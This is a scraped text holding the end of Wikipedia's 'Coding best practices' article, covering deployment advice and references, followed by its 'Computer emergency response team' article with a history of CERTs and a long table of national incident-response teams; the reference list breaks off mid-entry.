Design code with scalability and reuse in mind.


Code development
[
edit
]


Code building
[
edit
]


A best practice for building code involves daily builds and testing, or better still 
continuous integration
, or even 
continuous delivery
.



Testing
[
edit
]


Main article: 
Software testing


Testing is an integral part of software development that needs to be planned. It is also important that testing is done proactively; meaning that test cases are planned before coding starts, and test cases are developed while the application is being designed and coded.



Debugging the code and correcting errors
[
edit
]


Programmers tend to write the complete code and then begin debugging and checking for errors. Though this approach can save time in smaller projects, bigger and more complex ones tend to
have too many variables and functions that need attention. Therefore, it is good to debug every module once you are done and not the entire program. This saves time in the long run so that one does not end up wasting a lot of time on figuring out what is wrong. 
unit tests
 for individual modules and/or 
functional tests
 for 
web services
 and web applications can help with this.



Deployment
[
edit
]


Main articles: 
Software deployment
 and 
Deployment environment


Deployment is the final stage of releasing an application for users. Some best practices are:
[
23
]
[
24
]




Keep the installation structure simple: Files and directories should be kept to a minimum. Don’t install anything that’s never going to be used.


Keep only what is needed: The 
software configuration management
 activities must make sure this is enforced. Unused resources (old or failed versions of files, source code, interfaces, etc.) must be archived somewhere else to keep newer builds lean.


Keep everything updated: The software configuration management activities must make sure this is enforced. For delta-based deployments, make sure the versions of the resources that are already deployed are the latest before deploying the deltas. If not sure, perform a deployment from scratch (delete everything first and then re-deploy).


Adopt a multi-stage strategy: Depending on the size of the project, sometimes more deployments are needed.
[
25
]


Have a roll back strategy: There must be a way to roll-back to a previous (working) version.


Rely on automation for repeatable processes: There's far too much room for human error, deployments should not be manual. Use a tool that is native to each operating system or, use a scripting language for cross-platform deployments.
[
26
]
[
27
]


Re-create the real deployment environment: Consider everything (routers, firewalls, web servers, web browsers, file systems, etc.)


Do not change deployment procedures and scripts on-the-fly and, document such changes: Wait for a new iteration and record such changes appropriately.


Customize deployment: Newer software products such as APIs, micro-services, etc. require specific considerations for successful deployment.
[
28
]
[
29
]
[
30
]


Reduce risk from other development phases: If other activities such as testing and configuration management are wrong, deployment surely will fail.
[
31
]
[
32
]


Consider the influence each stakeholder has: Organizational, social, governmental considerations.
[
33
]
[
34
]
[
35
]


See also
[
edit
]


Best practice


List of tools for static code analysis


Motor Industry Software Reliability Association
 (MISRA)


Software Assurance


Software quality


List of software development philosophies


The Cathedral and the Bazaar
 - book comparing top-down vs. bottom-up open-source software


Davis 201 Principles of Software Development
[
36
]


Where's the Theory for Software Engineering?
[
37
]


Don't Make Me Think
 (Principles of intuitive navigation and information design)
[
38
]


Notes
[
edit
]






References
[
edit
]






^
 
McConnell, Steve
 (2004). 
Code Complete
. Redmond, Wash.: Microsoft Press. p. 
[
page needed
]
. 
ISBN
 
978-0-7356-9125-4
. 
OCLC
 
61315783
.




^
 
Sommerville, Ian (2004). 
Software Engineering
 (Seventh ed.). Pearson. p. 38. 
ISBN
 
0-321-21026-3
.




^
 
Bentley, Jon (1985). 
"Programming pearls: Bumper-Sticker Computer Science"
. 
Communications of the ACM
. 
28
 (9): 896–901. 
doi
:
10.1145/4284.315122
. 
ISSN
 
0001-0782
. 
S2CID
 
5832776
.




^
 
McConnell, Steve (2004). 
Code Complete
 (Second ed.). Microsoft Press. pp. 
649–659
. 
ISBN
 
0-7356-1967-0
.




^
 
Weinberg, Gerald (1998). 
The Psychology of Computer Programming
 (Silver anniversary ed.). Dorset House Publishing, New York. pp. 128–132. 
ISBN
 
978-0-932633-42-2
.




^
 
Sommerville, Ian (2004). 
Software Engineering
 (Seventh ed.). Pearson. pp. 12–13. 
ISBN
 
0-321-21026-3
.




^
 
Weinberg, Gerald (1998). 
The Psychology of Computer Programming
 (Silver anniversary ed.). Dorset House Publishing, New York. pp. 15–25. 
ISBN
 
978-0-932633-42-2
.




^
 
Hoare, C.A.R. (1972). 
"The Quality of Software"
. 
Software: Practice and Experience
. 
2
 (2). Wiley: 103–105. 
doi
:
10.1002/spe.4380020202
.




^
 
Meek, Brian; Heath, Patricia (1980), 
Guide to Good Programming Practice
, Ellis Horwood, Wiley, p. 14




^
 
McConnell, Steve (2004). 
Code Complete
 (Second ed.). Microsoft Press. p. 
40
. 
ISBN
 
0-7356-1967-0
.




^
 
Sacolick, Isaac (April 8, 2022). 
"A brief history of the agile methodology"
. 
Infoworld
. Retrieved 
February 6,
 2023
.




^
 
McConnell, Steve (2004). 
Code Complete
 (Second ed.). Microsoft Press. p. 
36
. 
ISBN
 
0-7356-1967-0
.




^
 
Meek, Brian; Heath, Patricia (1980), 
Guide to Good Programming Practice
, Ellis Horwood, Wiley, p. 15




^
 
Sommerville, Ian (2004). 
Software Engineering
 (Seventh ed.). Pearson. pp. 118–123. 
ISBN
 
0-321-21026-3
.




^
 
Hoare, C.A.R (1981). 
"The Emperor's Old Clothes"
 
(PDF)
. 
Communications of the ACM
. 
24
 (2). ACM: 75–83. 
doi
:
10.1145/358549.358561
. 
S2CID
 
97895
. Retrieved 
25 Nov
 2019
.




^
 
Sommerville, Ian (2004). 
Software Engineering
 (Seventh ed.). Pearson. pp. 242–243. 
ISBN
 
0-321-21026-3
.




^
 
Mayer, Herbert (1989). 
Advanced C programming on the IBM PC
. Windcrest Books. p. xii (preface). 
ISBN
 
0830693637
.




^
 
Meek, Brian; Heath, Patricia (1980), 
Guide to Good Programming Practice
, Ellis Horwood, Wiley, p. 37




^ 
a
 
b
 
McConnell, Steve (2004). 
Code Complete
 (Second ed.). Microsoft Press. p. 
70
. 
ISBN
 
0-7356-1967-0
.




^
 
Roedy Green. 
"unmaintainable code : Java Glossary"
. Retrieved 
2013-11-26
.




^
 
Multiple (wiki). 
"Best practices"
. 
Docforge
. Retrieved 
2012-11-13
.




^
 
"Single-Point-of-Definition by Example"
. Retrieved 
2015-11-30
. 
'Don't repeat anything. Aim for a Single Point of Definition for every aspect of your application [...]'.




^
 
"7 Application Deployment Best Practices - Done Devops"
. 
dzone.com
.




^
 
"The seven deadly sins of software deployment [LWN.net]"
. 
lwn.net
.




^
 
blog.fortrabbit.com/multi-stage-deployment-for-website-development




^
 
Cruz, Victor (April 3, 2013). 
"Why 30% of App Deployments fail"
. 
Wired
 – via www.wired.com.




^
 
"The rules of software deployment"
. Archived from 
the original
 on 2010-05-13.




^
 
"Tools You Need to Speed Up Deployment to Match Demand"
. February 3, 2017.




^
 
Ankerholz, Amber (September 14, 2016). 
"DevOps and the Art of Secure Application Deployment"
.




^
 
"Organizing Software Deployments to Match Failure Conditions"
. 
Amazon Web Services
. May 5, 2014.




^
 
"Best Practices for Risk-Free Deployment"
. 
TheServerSide.com
.




^
 
Ambler, Scott. 
"Effective Software Deployment"
. 
Dr. Dobb's
.




^
 
"Enterprise application deployment: The humanity of software implementation"
. Archived from 
the original
 on 2016-08-21.




^
 
"Hacking bureaucracy: improving hiring and software deployment | 18F: Digital service delivery"
. 
18f.gsa.gov
. 14 May 2014.




^
 
"A Bad Software Deployment Is Worse Than Doing Nothing"
. 
Intact Technology
. June 1, 2016.




^
 
Davis, Alan Mark. (1995). 
201 principles of software development
. New York: McGraw-Hill. 
ISBN
 
0-07-015840-1
. 
OCLC
 
31814837
.




^
 
Johnson, Pontus; Ekstedt, Mathias; Jacobson, Ivar (2012). "Where's the Theory for Software Engineering?". 
IEEE Software
. 
29
 (5): 96. 
doi
:
10.1109/MS.2012.127
. 
ISSN
 
0740-7459
. 
S2CID
 
38239662
.




^
 
Krug, Steve (2014). 
Don't make me think, revisited : a common sense approach to Web usability
. Bayle, Elisabeth,, Straiger, Aren,, Matcho, Mark (Third ed.). [San Francisco, California]. 
ISBN
 
978-0-321-96551-6
. 
OCLC
 
859556499
.
{{
cite book
}}
:  CS1 maint: location missing publisher (
link
)






Harbison, Samuel P.; 
Steele, Guy L.
 (2002). 
C - A Reference Manual
. 
ISBN
 
978-0-13-089592-9
.


Enhancing the Development Life Cycle to Product Secure Software, V2.0 Oct. 2008
 describes the security principles and practices that software developers, testers, and integrators can adopt to achieve the twin objectives of producing more secure software-intensive systems, and verifying the security of the software they produce.


Dutta, Shiv; Hook, Gary (June 26, 2003). 
"Best practices for programming in C"
. 
developerWorks
. 
IBM
. Archived from 
the original
 on July 13, 2009
. Retrieved 
January 21,
 2010
.


External links
[
edit
]


Paul Burden, co-author of the MISRA C Coding Standards and PRQA's representative on the MISRA C working group for more than 10 years discusses a common coding standard fallacy: 
"we don't need a coding standard!, we just need to catch bugs!"










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Coding_best_practices&oldid=1227594824
"


Categories
: 
Software development process
Computer programming
Hidden categories: 
Wikipedia articles needing page number citations from November 2023
CS1 maint: location missing publisher
Articles with short description
Short description is different from Wikidata
Articles lacking in-text citations from July 2012
All articles lacking in-text citations
Wikipedia articles with style issues from March 2008
All articles with style issues
Articles with multiple maintenance issues











From Wikipedia, the free encyclopedia






Organization which responds to computer security incidents


This article has multiple issues.
 Please help 
improve it
 or discuss these issues on the 
talk page
. 
(
Learn how and when to remove these messages
)




This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Computer emergency response team"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
December 2016
)
 (
Learn how and when to remove this message
)


This article's 
lead section
 
may be too short to adequately 
summarize
 the key points
.
 Please consider expanding the lead to 
provide an accessible overview
 of all important aspects of the article.
 
(
July 2024
)




 (
Learn how and when to remove this message
)



A 
computer emergency response team
 (
CERT
) is an 
incident response team
 dedicated to 
computer security
 
incidents
.

Other names used to describe CERT include 
cyber emergency response team
, 
computer emergency readiness team
, 
computer security incident response team
 (
CSIRT
), or 
cyber security incident response team
.





History
[
edit
]


The name "Computer Emergency Response Team" was first used in 1988 by the 
CERT Coordination Center
 (CERT-CC) at 
Carnegie Mellon University
 (CMU). The term CERT is registered as a trade and service mark by CMU in multiple countries worldwide. CMU encourages the use of Computer Security Incident Response Team (CSIRT) as a generic term for the handling of computer security incidents. CMU licenses the CERT mark to various organizations that are performing the activities of a CSIRT.

The histories of CERT and CSIRT, are linked to the existence of 
malware
, especially 
computer worms
 and 
viruses
. Whenever a new 
technology
 arrives, its misuse is not long in following. The first worm in the 
IBM
 
VNET
 was covered up. Shortly after, a worm hit the 
Internet
 on 3 November 1988, when the so-called 
Morris Worm
 paralysed a good percentage of it.  This led to the formation of the first computer emergency response team at Carnegie Mellon University under a 
U.S. Government
 contract. With the massive growth in the use of information and communications technologies over the subsequent years, the generic term 'CSIRT' refers to an essential part of most large organisations' structures. In many organisations the CSIRT evolves into an 
information security operations center
.



Global associations and teams
[
edit
]










Logo



Organization



Description



Size



Member of FIRST









FIRST
[
1
]




The Forum of Incident Response and Security Teams is the global association of CSIRTs.



605 member organizations.



n/a










Packet Clearing House
[
2
]




"CERT of last resort" with global coverage, serving countries and constituencies which are not yet served by their own dedicated CERT. Founded in 1994.



18 staff, presence in 106 countries, budget US$251m/yr.



Yes



National or economic region teams
[
edit
]










Country



Team/s



Description



Size



Member of FIRST





 
Algeria




CERIST
[
3
]




The Research Centre on Scientific and Technical Information in Algeria, CERIST.













 
Australia




AusCERT
[
4
]




Cyber Emergency Response Team (CERT) in Australia and the Asia/Pacific region
[
5
]








Yes





 
Australia




Australian Cyber Security Centre (ACSC)
[
6
]




In 2010 the Australian Federal Government started CERT Australia. In 2018 CERT Australia became part of the 
Australian Cyber Security Centre
 (ACSC) which then in turn became part of the 
Australian Signals Directorate
 (ASD).







Yes





 
Austria




CERT.at
[
7
]




The national Computer Emergency Response Team for Austria as part of the Austrian domain registry NIC.at
[
8
]
 for 
.at
.
[
9
]




9 employees
[
10
]




Yes





 
Austria




govCERT  Austria
[
11
]




A public-private partnership of CERT.at and the 
Austrian Chancellery
.
[
12
]








Yes





 
Austria




Austrian Energy CERT (AEC)



A cooperation between CERT.at and the Austrian energy sector for energy and gas sector.
[
13
]








Yes





 
Austria




ACOnet-CERT



The Computer Emergency Response Team of 
ACOnet
.
[
14
]








Yes





 
Azerbaijan




CERT.gov.az
[
15
]




Azerbaijan Government Computer Emergency Response Team.







Yes





 
Bangladesh




BGD e-Gov CIRT
[
16
]




Bangladesh Government's Computer Incident Response Team (BGD e-GOV CIRT) is acting as the National CIRT of Bangladesh (N-CIRT) currently with responsibilities including receiving, reviewing, and responding to computer security incidents and activities.







Yes





 
Belgium




CERT.be
[
17
]




Centre for Cyber Security Belgium







Yes





 
Bolivia




CGII.gob.bo
[
18
]




Centro de Gestión de Incidentes Informáticos



8 employees









 
Brazil




CERT.br
[
19
]




Brazilian National Computer Emergency Response Team







Yes





 
Canada




Canadian Centre for Cyber Security
[
20
]




Assumed national CERT role with the transfer of the Canadian Cyber Incident Response Centre (CCIRC) from Public Safety Canada in October 2018.
[
21
]








Yes





 
China




CNCERT/CC
[
22
]




Founded in September 2002



40 employees
[
23
]




Yes





 
Colombia




colCERT
[
24
]




Grupo de Respuesta a Emergencias Cibernéticas de Colombia - colCERT













 
Croatia




CARNET
 CERT











Yes





 
Czech Republic




CSIRT.CZ












Yes





 
Denmark




DKCERT
[
25
]




Danish Computer Security Incident Response Team







Yes





 
Denmark




CFCS-DK
[
26
]




Centre for Cyber Security







Yes





 
Ecuador




ECUCERT
[
27
]




Centro de Respuesta a Incidentes Informáticos del Ecuador







Yes





 
Egypt




EG-CERT
[
28
]




Work as trust center for Cyber Security Services across Egyptian cyber space.
[
29
]








Yes





 
Estonia




CERT-EE
[
30
]




The national and governmental Computer Emergency Response Team for Estonia.







Yes





 
Europe




CERT-EU
[
31
]




Computer Emergency Response Team (CERT-EU) for the EU institutions, agencies and bodies.
[
32
]








Yes





Eurocontrol



EATM-CERT
[
33
]




European Air Traffic Management Computer Emergency Response Team













 
Finland




NCSC-FI
[
34
]




National Cyber Security Centre of Finland







Yes





 
France




CERT-FR
[
35
]










Yes





 
Germany




CERT-Bund
[
36
]












Yes





 
Ghana




NCA-CERT, CERT-GH
[
37
]
[
38
]




National Communications Authority Computer Emergency Response Team and National Cyber Security Centre of Ghana.









 
Hong Kong




HKCERT
[
39
]












Yes





 
Iceland




CERT-IS
[
40
]




The national Computer Emergency Response Team for Iceland as part of the 
Post and Telecommunication Administration
 in Iceland







Yes





 
India




CERT-In
[
41
]




CERT-In








Yes





 
Indonesia




ID-SIRTII/CC



Indonesia Security Incident Response Team on Internet Infrastructure coordination centre was founded in 2007.
[
42
]








Yes





 
Iran




CERT MAHER
[
43
]




Maher Center of Iranian National Computer Emergency Response Team













 
Israel




CERT-IL
[
44
]




The Israeli Cyber Emergency Response Team is part of 
Israel National Cyber Directorate








Yes





 
Italia




CSIRT Italia
[
45
]




Established at the National Cybersecurity Agency for the implementation of the NIS Directive in Italy absorbed previous CERT-PA and CERT-Nazionale.













 
Japan




JPCERT/CC












Yes





 
Japan




IPA-CERT












Yes





 
Jersey




CERT-JE
[
46
]




Jersey Cyber Emergency Response Team. Established 2021.
[
47
]














 
Kazakhstan




KZ-CERT




KZ-CERT National сomputer emergency response team







Yes





 
Kyrgyzstan




CERT-KG
[
citation needed
]


















 
Laos




LaoCERT
[
48
]




Lao Computer Emergency Response Team













 
Latvia




CERT.LV
[
49
]




The Information Technology Security Incident Response Institution of the Republic of Latvia.







Yes





 
Lithuania




NRD CIRT
[
50
]




NRD Cyber Security Incident Response Team. It is the first private incident response team in Lithuania.







Yes





 
Luxembourg




CIRCL
[
51
]




CIRCL is the CERT for the private sector, communes and non-governmental entities in Luxembourg.







Yes





 
Macau




MOCERT


















 
Malaysia




MyCERT
[
52
]




The Malaysia Computer Emergency Response Team was established in 1997. It is now part of CyberSecurity Malaysia
[
53
]








Yes





 
Mexico




CERT-MX




The Centre of Expertise in Technological Response, is part of the Scientific Division of the 
Federal Police (Mexico)








Yes





 
Moldova




CERT-GOV-MD
[
54
]




Center for Response on Cybersecurity Incidents – CERT-GOV-MD







Yes





 
Mongolia




MNCERT/CC




Mongolian Cyber Emergency Response Team / Coordination Center. Founded in 2014.







Yes





 
Morocco




maCERT
[
55
]












Yes





 
Netherlands




NCSC-NL
 [
nl
]


















 
Netherlands




SURFcert
[
56
]




Computer Emergence Response Team for the Dutch research and education network.







Yes





 
New Zealand




CERTNZ
[
57
]












Yes





 
Nigeria




ngCERT
[
58
]












Yes





 
Norway




NorCERT
[
59
]




Cyber Security Center and national CERT of Norway. Part of the 
National Security Authority (
NSM
)
.







Yes





 
Pakistan




PakCERT


















 
Papua New Guinea




PNGCERT
[
60
]


















 
Philippines




CSP-CERT
[
61
]




CyberSecurity Philippines – CERT, established in 2016 the very first Non-profit CSIRT/CERT organization in the Philippines.













 
Poland




CERT Polska












Yes





 
Portugal




CERT.PT
[
62
]




Part of the National Cyber Security Center (CNCS) of Portugal







Yes





 
Qatar




Q-CERT












Yes





 
Republic of Ireland




CSIRT-IE


















 
Romania




CERT-RO
[
63
]




Centrul Naţional de Răspuns la Incidente de Securitate Cibernetică – CERT-RO













 
Russia




GOV-CERT
[
64
]


















 
Russia




RU-CERT
[
65
]












Yes





 
Russia




CERT-GIB
[
66
]


















 
Russia




BI.ZONE-CERT
[
67
]


















 
Russia




Financial CERT
[
68
]




Financial Sector Computer Emergency Response Team (special division of the Bank of Russia)







Yes





 
Russia




KASPERSKY ICS CERT
[
69
]


















 
Russia




NCIRCC
[
70
]


















 
Saudi Arabia




Saudi-CERT
[
71
]




Saudi CERT has three main functions: increasing the level of knowledge and awareness regarding cybersecurity, disseminate information about vulnerabilities, and campaigns and cooperating with other response teams. Saudi CERT serves different stakeholder in the country including individuals business and government agencies. And proactive and reactive services.







Yes





 
Serbia




SRB-CERT
[
72
]




National CERT of the Republic of Serbia







Yes





 
Serbia




MUP CERT
[
73
]




Centar za reagovanje na napade na informacioni sistem







Yes





 
Singapore




SingCERT
[
74
]




Singapore Cyber Emergency Response Team







Yes





 
Slovakia




SK-CERT
[
75
]




Národná jednotka SK-CERT| National unit SK-CERT







Yes





 
Slovenia




SI-CERT
[
76
]




Slovenian Computer Emergency Response Team, part of 
ARNES








Yes





 
Slovenia




SIGOV-CERT
[
77
]




Specifically formed for information security in the government sector of 
Slovenia














 
South Africa




CSHUB-CSIRT
[
78
]




CyberSecurity Hub CSIRT established by the 
Department of Telecommunications and Postal Services
[
79
]














 
South Korea




KrCERT/CC
[
80
]












Yes





 
Spain




CCN-CERT
[
81
]




Centro Criptológico Nacional







Yes





 
Sri Lanka




SL CERT | CC
[
82
]




Computer Emergency Readiness Team | Co-ordination Center







Yes





 
Sweden




CERT-SE
[
83
]












Yes





  
Switzerland




GovCERT.ch
[
84
]




The parent organisation of GovCERT.ch is the Swiss Reporting and Analysis Centre for Information Assurance (MELANI)
[
85
]








Yes





 
Taiwan




TWCERT/CC
[
86
]












Yes





 
Thailand




ThaiCERT
[
87
]












Yes





 
Togo




CERT-TG
[
88
]




Togo - Computer Emergency Response Team







Yes





 
Tonga




CERT Tonga
[
89
]


















 
Turkey




TR-CERT
 (USOM)











Yes





 
Ukraine




FS Group
[
90
]




FS Group – CERT







Yes





 
Ukraine




CERT-UA
[
91
]




Computer Emergency Response Team of Ukraine







Yes





 
United Arab Emirates




aeCERT
[
92
]




The United Arab Emirates – Computer Emergency Response Team







Yes





 
Uganda




CERT.UG
[
93
]




Uganda National Computer Emergency Response Team /CC (Absorbed UG-CERT
[
94
]
)







Yes





 
United Kingdom




National Cyber Security Centre




Absorbed CERT-UK







Yes





 
United States




US-CERT




Part of the 
National Cyber Security Division
 of the 
United States Department of Homeland Security
.
[
95
]








Yes





 
United States




CERT/CC




Created by the 
Defense Advanced Research Projects Agency
 (DARPA) and run by the 
Software Engineering Institute
 (SEI) at the 
Carnegie Mellon University








Yes





 
Uzbekistan




UzCERT
[
96
]




Computer Emergency Response Team of Uzbekistan













 
Vietnam




VNCERT
[
97
]




Vietnam CERT







Yes



See also
[
edit
]


Call center


Customer service


Digital humanitarianism


Emergency prevention


Critical infrastructure protection


Proactive cyber defence


White hat (computer security)


Help desk


Incident management


Information security


Responsible disclosure


Service desk


Vulnerability (computing)


References
[
edit
]






^
 
"FIRST – Improving Security Together"
. 
FIRST
. Retrieved 
6 December
 2018
.




^
 
"Packet Clearing House"
. Retrieved 
11 January
 2022
.




^
 
"CERIST (Centre de Recherche sur l'Information Scientifique et Technique ) - CERIST"
. 
www.cerist.dz
. Retrieved 
25 October
 2023
.




^
 
"About AusCERT – AusCERT Main"
. 
Auscert.org.au
. Retrieved 
2 December
 2016
.




^
 
Smith, Frank; Ingram, Graham (2 November 2017). 
"Organising cyber security in Australia and beyond"
. 
Australian Journal of International Affairs
. 
71
 (6): 642–660. 
doi
:
10.1080/10357718.2017.1320972
. 
ISSN
 
1035-7718
. 
S2CID
 
157160755
.




^
 
"About | Cyber.gov.au"
. 
cyber.gov.au
. Archived from 
the original
 on 30 October 2019
. Retrieved 
29 September
 2019
.




^
 
"CERT.at"
. 
www.cert.at
. Retrieved 
25 October
 2023
.




^
 
"nic.at Domain Registry"
. 
www.nic.at
. Retrieved 
25 October
 2023
.




^
 
"Zuständigkeit – CERT.at"
. 
cert.at
. Retrieved 
17 June
 2017
.




^
 
"Das Team – CERT.at"
. 
cert.at
. Retrieved 
30 June
 2017
.




^
 
"GovCERT Austria"
. 
GovCERT Austria
. 18 October 2023
. Retrieved 
25 October
 2023
.




^
 
"GovCERT in Österreich – GovCERT.gv.at"
. 
govcert.gv.at
. Retrieved 
17 June
 2017
.




^
 
"- CERT.at"
. 
cert.at
. Retrieved 
17 June
 2017
.




^
 
"Security"
. 
aco.net
. Retrieved 
17 June
 2017
.




^
 
"Kompüter insidentlərinə qarşı mübarizə mərkəzi"
. 
cert.gov.az
. Retrieved 
25 October
 2023
.




^
 
"Bangladesh Government's Computer Incident Response Team"
. Bangladesh Computer Council. 2023
. Retrieved 
4 December
 2023
.




^
 
"CERT.be The Federal Cyber Emergency Team"
. FPS Chancellery of the Prime Minister. 2023
. Retrieved 
4 December
 2023
.




^
 
"Centro de Gestión de Incidentes Informáticos"
. 
cgii.gob.bo
. Retrieved 
25 October
 2023
.




^
 
"CERT.br - Centro de Estudos, Resposta e Tratamento de Incidentes de Segurança no Brasil"
. 
www.cert.br
. Retrieved 
25 October
 2023
.




^
 
"About the Cyber Centre"
. 
Canadian Centre for Cyber Security
. 5 May 2022
. Retrieved 
25 October
 2023
.




^
 
Toolkit, Web Experience. 
"The Minister of National Defence Announces the Launch of the Canadian Centre for Cyber Security"
. 
cse-cst.gc.ca
. Retrieved 
2 December
 2018
.




^
 
"About CNCERT"
. CNCERT. Archived from 
the original
 on 16 August 2017
. Retrieved 
16 August
 2017
.




^
 
"中国互联网网络安全报告"
 
(PDF)
. 
cert.org.cn
. Archived from 
the original
 
(PDF)
 on 25 July 2018
. Retrieved 
25 July
 2018
.




^
 
"ColCERT"
. 
www.colcert.gov.co
. Retrieved 
25 October
 2023
.




^
 
"DKCERT - Danish Computer Security Incident Response Team"
. 
DKCERT - Danish Computer Security Incident Response Team
. Retrieved 
25 October
 2023
.




^
 
"Center for Cybersikkerhed"
. 
Center for Cybersikkerhed
. Retrieved 
25 October
 2023
.




^
 
"EcuCERT de Arcotel – Centro de Respuesta a Incidentes Informáticos de la ARCOTEL"
. Retrieved 
25 October
 2023
.




^
 
"EG-CERT"
. Retrieved 
7 November
 2017
.




^
 
"EG-CERT Team Information"
. Retrieved 
7 November
 2017
.




^
 
"CERT Estonia"
. Retrieved 
15 November
 2018
.




^
 
"CERT-EU"
. Retrieved 
26 February
 2020
.




^
 
"CERT-EU team information"
. Retrieved 
26 February
 2020
.




^
 
"European Air Traffic Management Computer Emergency Response"
. Eurocontrol. 2023
. Retrieved 
4 December
 2023
.




^
 
"Homepage"
. 
NCSC-FI
. 20 October 2023
. Retrieved 
25 October
 2023
.




^
 
"CERT-FR – Centre gouvernemental de veille, d'alerte et de réponse aux attaques informatiques"
. 
www.cert.ssi.gouv.fr
. Retrieved 
25 October
 2023
.




^
 
"Warn- und Informationsdienst"
. 
wid.cert-bund.de
. Retrieved 
25 October
 2023
.




^
 
"NCA CERT Portal"
. 
nca-cert.org.gh
. Retrieved 
25 October
 2023
.




^
 
"Cyber Security Agency, Ghana"
. Cyber Security Authority. 2023
. Retrieved 
4 December
 2023
.




^
 
"Hong Kong Computer Emergency Response Team Coordination Center"
. 
www.hkcert.org
. Retrieved 
25 October
 2023
.




^
 
"Forsíða"
. 
www.cert.is
. Retrieved 
25 October
 2023
.




^
 
"Indian Computer Emergency Resonse Team"
. Ministry of Electronics and Information Technology, Government of India. 2023
. Retrieved 
4 December
 2023
.




^
 
"ID-SIRTII/CC"
. 
FIRST – Forum of Incident Response and Security Teams
. Retrieved 
30 June
 2017
.




^
 
"مرکز مدیریت امداد و هماهنگی عملیات رخدادهای رایانه‌ای | مرکز مدیریت امداد و هماهنگی عملیات رخدادهای رایانه‌ای"
. 
cert.ir
. Retrieved 
25 October
 2023
.




^
 
"המרכז הארצי לניהול אירועי סייבר (CERT) | מערך הסייבר הלאומי"
. 
www.gov.il
 (in Hebrew)
. Retrieved 
25 October
 2023
.




^
 
"CSIRT Italia"
. 
www.csirt.gov.it
. Retrieved 
25 October
 2023
.




^
 
"Jersey Cyber Emergency Response Team"
. Retrieved 
1 July
 2021
.




^
 
"Cyber resilience team established"
. Retrieved 
1 July
 2021
.




^
 
"Home - ລາວເຊີດ"
. 
www.laocert.gov.la
. Retrieved 
25 October
 2023
.




^
 
"CERT.LV"
. 
cert.lv
. Retrieved 
25 October
 2023
.




^
 
"NRD CIRT"
. 
nrdcs.lt
. Retrieved 
23 July
 2024
.




^
 
"CIRCL » CIRCL -- Computer Incident Response Center Luxembourg -- CSIRT -- CERT"
. 
circl.lu
. Retrieved 
25 October
 2023
.




^
 
"MyCERT : Home"
. 
www.mycert.org.my
. Retrieved 
25 October
 2023
.




^
 
"CyberSecurity Malaysia | An Agency Under MOSTI"
. 
cybersecurity.my
. Archived from 
the original
 on 4 May 2019
. Retrieved 
22 September
 2017
.




^
 
https://stisc-cert.gov.md/
 
[
bare URL
]




^
 
https://www.dgssi.gov.ma/fr
 
[
bare URL
]




^
 
"SURFcert: 24/7 support for security incidents | SURF.nl"
. 
www.surf.nl
. Retrieved 
25 October
 2023
.




^
 
"About us | CERT NZ"
. 
cert.govt.nz
. Retrieved 
11 April
 2017
.




^
 
"ngCERT"
. 
Cert.gov.ng
. 15 May 2015
. Retrieved 
2 December
 2016
.




^
 
"NorCert – Nasjonalt Cybersikkerhetssenter"
. 
nsm.stat.no
. Retrieved 
26 August
 2018
.




^
 
"Papua New Guinea Computer Emergency Response Team"
. 
www.pngcert.org.pg
. Retrieved 
25 October
 2023
.




^
 
"CSP-CERT® | Cyber Security Philippines - Computer Emergency Response Team®"
. 
www.cert.ph
. Retrieved 
25 October
 2023
.




^
 
"CNCS - CERT.PT"
. 
www.cert.pt
. Retrieved 
25 October
 2023
.




^
 
https://www.cert.ro/
 
[
bare URL
]




^
 
http://www.gov-cert.ru/
 
[
bare URL
]




^
 
"RU-CERT"
. 
www.cert.ru
. Retrieved 
25 October
 2023
.




^
 
"CERT-GIB - Computer Security Incident Response Team by Group-IB"
. Archived from 
the original
 on 4 September 2016
. Retrieved 
29 May
 2019
.




^
 
"BI.ZONE — компания по управлению цифровыми рисками"
. 
BI.ZONE
. 13 October 2023
. Retrieved 
25 October
 2023
.




^
 
"Financial CERT | Bank of Russia"
. 
www.cbr.ru
. Retrieved 
25 October
 2023
.




^
 
"Kaspersky ICS CERT"
. 
ics-cert.kaspersky.com
. Retrieved 
25 October
 2023
.




^
 
"CERT.GOV.RU - Home"
. 
cert.gov.ru
. Retrieved 
25 October
 2023
.




^
 
"المركز الوطني الإرشادي للأمن السيبراني"
. 
cert.gov.sa
. Retrieved 
25 October
 2023
.




^
 
"Nacionalni CERT Republike Srbije"
. 
CERT.RS
. Retrieved 
25 October
 2023
.




^
 
"Archived copy"
. Archived from 
the original
 on 28 March 2021
. Retrieved 
15 September
 2020
.
{{
cite web
}}
:  CS1 maint: archived copy as title (
link
)




^
 
"About SingCERT"
. 
www.csa.gov.sg
. Retrieved 
25 October
 2023
.




^
 
"Aktuality"
. 
www.sk-cert.sk
. 18 October 2023
. Retrieved 
25 October
 2023
.




^
 
"Naslovnica"
. 
SI CERT
. 17 October 2023
. Retrieved 
25 October
 2023
.




^
 
"Informacijska varnost | GOV.SI"
. 
www.gov.si
. Retrieved 
25 October
 2023
.




^
 
"HOME - CyberSecurity Hub"
. 
www.cybersecurityhub.gov.za
. Retrieved 
25 October
 2023
.




^
 
"CSHUB-CSIRT description according to RFC2350"
 
(PDF)
. 
cybersecurityhub.gov.za
. Retrieved 
18 February
 2021
.




^
 
"KISA 보호나라&KrCERT/CC"
. 
www.krcert.or.kr
. Retrieved 
25 October
 2023
.




^
 
"CCN-CERT - Inicio"
. 
www.ccn-cert.cni.es
. Retrieved 
25 October
 2023
.




^
 
"Welcome to Sri Lanka CERT|CC"
. 
slcert.gov.lk
. Retrieved 
27 May
 2018
.




^
 
"About CERT-SE – CERT-SE website"
. 
cert.se
. Retrieved 
18 January
 2017
.




^
 
"Swiss Government Computer Emergency Response Team (GovCERT.ch)"
. 
govcert.admin.ch
. Retrieved 
13 May
 2018
.




^
 
"Reporting and Analysis Centre for Information Assurance (MELANI)"
. 
melani.admin.ch
. Retrieved 
13 May
 2018
.




^
 
"TWCERT/CC 台灣電腦網路危機處理暨協調中心"
. 
Cert.org.tw
. 27 September 2010. Archived from 
the original
 on 14 November 2016
. Retrieved 
2 December
 2016
.




^
 
"เกี่ยวกับไทยเซิร์ต"
 [About ThaiCert] (in Thai). Thailand Computer Emergency Response Team. Archived from 
the original
 on 21 September 2018
. Retrieved 
28 April
 2019
.




^
 
"CERT.TG – La protection du cyberespace Togolais"
. 
cert.tg
. Retrieved 
25 October
 2023
.




^
